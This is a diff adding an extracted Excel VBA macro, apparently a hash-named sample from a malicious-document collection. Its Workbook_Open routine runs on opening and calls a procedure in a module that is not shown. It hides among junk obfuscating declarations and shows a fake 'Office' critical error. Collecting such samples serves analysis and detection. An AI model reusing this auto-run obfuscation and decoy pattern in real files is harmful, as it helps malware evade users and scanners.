@@ -1,0 +1,58 @@
+Filename     : ./macros/861be83b01ace28a6586aa980cdd35dfbc49b4715c0a8de479b9d0309cab174c
+OLE stream   : VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub workbook_open()
+
+
+VBSo.qTgpBWruhjlMlOlliTUf
+Dim QOvoekwmmpzXWjucSUJfdHsWWMmFWqWFsvVcYsKRaFIrkOqBTJTNJpCJVYS As Integer
+If SyqQvTuebOSEaJsEYyBmIWklMXIvDtMGzasSjoNXpjOnBEsDRkdKUmJvN = FDXLzbiCMFAQZVjkdwYHxkHfFeSPBlMQxFelqMqIglozsmrPuarqlnQUw Then
+Dim rFUJTAaskTTqytQFQbMvHnSmCUatWeJpJpyGVzMkNHHSXYwgakVMDZoEn As Worksheet
+Dim iGyagWFKehJvJkRObhAfzPdYuTlJxlkAuTnsOJhlCItr
+Dim nlQADxcroZnTcagNkvNsxIAqwYARAOcrWmkIClGzJsMVf As String
+End If
+Dim UQndTBHuAufkaEfwKrZwwxqqXLzpNjEvfKcINogNVwVrFXch As Integer
+If aCzAmYjXaxFIBShQpjFPbXjWKMbzbykAiSOKjDIGa = EhPiYLCPEBVSMFDTdqaxkvbMFZjEWhlaypX Then
+Dim pTnlAYkWwPiWNKr As Worksheet
+Dim GNhJqIGDczcysXPvTWiOzpEaYAZfxX
+Dim CWtfaYspzOiQLmYZrygTPzfvrRIHkpjbFEwFE As String
+End If
+Dim NxrCdXTfjdRByI As Integer
+If aydICrynJPlFJeHKGqSVeBpRlc = LPInrFlhJccwtOGZnbRXOpYZXbiddYIMWagifVYfUbVehKwEOFONAONV Then
+Dim rjQPXHDkUQaSiXtSDmCmTtrMeeOYKuLHMKrwFIHNXkKRkdWrLvKNMbBysD As Worksheet
+Dim kssfZZESGXfxMuepOjiZcBHXNOkyvlItEBXPUsLlNRXyLN
+Dim jPjWMSPSbjlVSLoGWUOmtLWPUWXx As String
+End If
+
+anWoLpIGjLPjIPr = MsgBox("Office", vbCritical, "MS")
+Dim MKdILzfVOYYqdlaoezZzwGvCkYTXsTCquSFQGcJSfT As Integer
+If rxvYIHlilVwXA = FPaYnfHcuWivLgJiBqHUdPxGM Then
+Dim PLmKihtWRzAfDWmXrwbNcxbbAjepDXqSTMXUVSMppYtgJCyUUwlSVtj As Worksheet
+Dim SkLKzCDTuJiLrySCYkmXDEvRxlKVHlXxZcEjJINml
+Dim FzWbqGVBuNijVfO As String
+End If
+Dim otMNsiMIllmOtisQXzlxFYqGfpTMYpNEwqvQvzuDtqlpErbSBwLj As Integer
+If jhJPCGiCOzkwXi = RDncUXFiEOnABnNALbeeUPhgNpQrpuGoSWZ Then
+Dim YfYcneBdubCEvpNoJRsNCVHPfGNtJIyieNpVmzqASlnELkVCbGwXZI As Worksheet
+Dim WCYJwgQITmcTZhzsBKasvRiCEulKRDLbIWqnxdCKjKRAbrLoDjEm
+Dim whNFUVECvFqQaALDqMuYHQIlzhaNjxHiyYfb As String
+End If
+Dim IlTcYAPeUAabfHxroge As Integer
+If fYcFmurSyxHSC = VkuFsRAHBeRyHzhbzQt Then
+Dim StzCgfgighQgMiYGvNsyWfXetLHeuJqyhOzIVhNZMjTZkyEQjt As Worksheet
+Dim mOHSWmWUJVYBnWrSyyiPkNzSmnMxuvGqvBXcrPrNmAYsBKw
+Dim wiRzGhTJZOogjaYaNPhGmzPajGVdjoHQbqPOcvzJbrxNCjInN As String
+End If
+
+
+End Sub
+
